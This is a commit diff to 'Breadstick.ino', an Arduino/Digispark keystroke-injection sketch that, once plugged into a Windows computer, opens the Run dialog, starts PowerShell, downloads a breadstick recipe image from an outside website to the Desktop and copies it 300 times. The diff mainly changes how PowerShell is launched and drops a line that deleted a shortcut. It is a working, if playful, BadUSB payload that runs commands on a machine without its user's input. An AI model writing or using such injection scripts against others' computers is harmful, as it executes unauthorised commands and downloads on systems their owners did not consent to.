2e32c5abaf65bd45a29a5fef979e51eb595d1b01
bwees <brandonwees@gmail.com>
2020-06-26 17:14:32 -0400

    Update Breadstick.ino

--- Breadstick/Breadstick.ino
+++ Breadstick/Breadstick.ino
@@ -6,29 +6,17 @@
 
 void setup() {
     DigiKeyboard.sendKeyStroke(0);
-    DigiKeyboard.sendKeyStroke(KEY_H,MOD_ALT_LEFT);
-    DigiKeyboard.delay(10);
-    DigiKeyboard.print("W");
-    DigiKeyboard.delay(10);
-    DigiKeyboard.print("S");
-    DigiKeyboard.delay(300);
+    DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_R);
+    DigiKeyboard.delay(50);
     DigiKeyboard.print("powershell");
-    DigiKeyboard.delay(300);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(100);
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(100);
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(100);
+    DigiKeyboard.delay(50);
     DigiKeyboard.print("Invoke-WebRequest https://www.iheartnaptime.net/wp-content/uploads/2019/01/breadsticks-recipe.jpg -OutFile ~/Desktop/breadstick.jpg");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(100);
+    DigiKeyboard.delay(50);
     DigiKeyboard.print("foreach($number in 1..300) { Copy-Item '~/Desktop\\breadstick.jpg' -Destination ""~/Desktop\\breadstick$number.jpg""}");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(100);
-    DigiKeyboard.print("Remove-Item  ~/Desktop\\powershell.lnk");
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(100);
+    DigiKeyboard.delay(50);
     DigiKeyboard.print("exit");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);}
 
